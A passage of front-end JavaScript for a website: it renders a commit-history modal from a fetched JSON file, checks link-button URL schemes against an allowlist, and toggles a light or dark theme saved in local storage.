            <button class="history-close" onclick="closeHistoryModal()">&times;</button>
          </div>
          <div id="historyContent">
            <p style="color: #888;">Loading history...</p>
          </div>
        </div>
      `;
  overlay.addEventListener("click", function (e) {
    if (e.target === overlay) {
      closeHistoryModal();
    }
  });
  document.body.appendChild(overlay);
}

async function showHistoryModal(origin, basePath) {
  const overlay = document.getElementById("historyOverlay");
  const content = document.getElementById("historyContent");
  overlay.style.display = "flex";

  try {
    const historyJson = await fetch(`${origin}${basePath}/history.json`, {
      method: "GET",
      headers: {
        "Cache-Control": "no-cache, must-revalidate",
      },
    });

    if (historyJson.ok) {
      const history = await historyJson.json();
      if (history.length === 0) {
        content.innerHTML = '<p style="color: #888;">No history available.</p>';
      } else {
        let html = "";
        for (const commit of history) {
          html += `<div class="history-item">`;
          html += `<div class="history-item-header">`;
          html += `<span class="history-sha">${commit.shortSha}</span>`;
          html += `<span class="history-date">${commit.date}</span>`;
          html += `</div>`;
          html += `<div class="history-message">${escapeHtml(
            commit.message
          )}</div>`;
          html += `<div class="history-author">by ${escapeHtml(
            commit.author
          )}</div>`;

          // Show file changes if available
          if (commit.changes && commit.changes.length > 0) {
            html += `<div class="history-changes">`;
            for (const change of commit.changes) {
              const statusClass = `change-${change.status}`;
              const statusIcon = change.status === "added" ? "+" : change.status === "deleted" ? "−" : "~";
              html += `<div class="history-change-item ${statusClass}">`;
              html += `<span class="change-icon">${statusIcon}</span>`;
              html += `<span class="change-file">${escapeHtml(change.file)}</span>`;
              html += `</div>`;

              // Show line-level diffs if available
              if (change.diff && change.diff.length > 0) {
                html += `<div class="history-diff">`;
                for (const line of change.diff) {
                  const lineClass = line.type === "add" ? "diff-add" : "diff-del";
                  const linePrefix = line.type === "add" ? "+" : "-";
                  html += `<div class="diff-line ${lineClass}">`;
                  html += `<span class="diff-prefix">${linePrefix}</span>`;
                  html += `<span class="diff-content">${escapeHtml(line.content)}</span>`;
                  html += `</div>`;
                }
                if (change.truncated) {
                  html += `<div class="diff-truncated">... more lines not shown</div>`;
                }
                html += `</div>`;
              }
            }
            html += `</div>`;
          }

          html += `</div>`;
        }
        content.innerHTML = html;
      }
    } else {
      content.innerHTML = '<p style="color: #888;">History not available.</p>';
    }
  } catch (error) {
    console.error("Error fetching history:", error);
    content.innerHTML =
      '<p style="color: #ff4444;">Failed to load history.</p>';
  }
}

function closeHistoryModal() {
  const overlay = document.getElementById("historyOverlay");
  overlay.style.display = "none";
}

function escapeHtml(text) {
  const div = document.createElement("div");
  div.textContent = text;
  return div.innerHTML;
}

// URL-scheme allowlist for the link-button code-block. Markdown links
// in the body are sanitized by DOMPurify (which strips javascript: by
// default), but link buttons are constructed via direct property
// assignment (linkButton.href = url) which bypasses that — so we
// validate the scheme here instead. Permitted: absolute http(s),
// mailto:, fragment-only (#), and relative paths (/, ./, ../).
function isSafeButtonUrl(url) {
  if (typeof url !== "string") return false;
  const trimmed = url.trim();
  if (!trimmed) return false;
  if (/^https?:\/\//i.test(trimmed)) return true;
  if (/^mailto:/i.test(trimmed)) return true;
  if (trimmed.startsWith("/") || trimmed.startsWith("#")) return true;
  if (trimmed.startsWith("./") || trimmed.startsWith("../")) return true;
  return false;
}

// Theme toggle functionality. Default to the OS color-scheme preference
// when the visitor hasn't explicitly chosen a theme yet.
function initTheme() {
  const stored = localStorage.getItem("pluribus-site-theme");
  const prefersLight = window.matchMedia
    && window.matchMedia("(prefers-color-scheme: light)").matches;
  const isLight = stored ? stored === "light" : prefersLight;
  if (isLight) {
    document.body.classList.add("light-mode");
    updateThemeIcon(true);
  }
}

function toggleTheme() {
  const isLight = document.body.classList.toggle("light-mode");
  localStorage.setItem("pluribus-site-theme", isLight ? "light" : "dark");
  updateThemeIcon(isLight);
}

function updateThemeIcon(isLight) {
  const icon = document.getElementById("themeIcon");
  if (icon) {
    icon.textContent = isLight ? "☀️" : "🌙";
  }
}

function showThemePreview() {
  const button = document.getElementById("themeToggle");
  const icon = document.getElementById("themeIcon");
  if (icon) {
    const isCurrentlyLight = document.body.classList.contains("light-mode");
    // Show the opposite mode (what it will switch to)
    icon.textContent = isCurrentlyLight ? "🌙" : "☀️";
  }
}

function hideThemePreview() {
  const isCurrentlyLight = document.body.classList.contains("light-mode");
  let button = document.getElementById("themeToggle");
  button.classList.remove("theme-toggle");
  button.classList.add("theme-toggle");
  updateThemeIcon(isCurrentlyLight);
}

// Initialize theme on page load
initTheme();
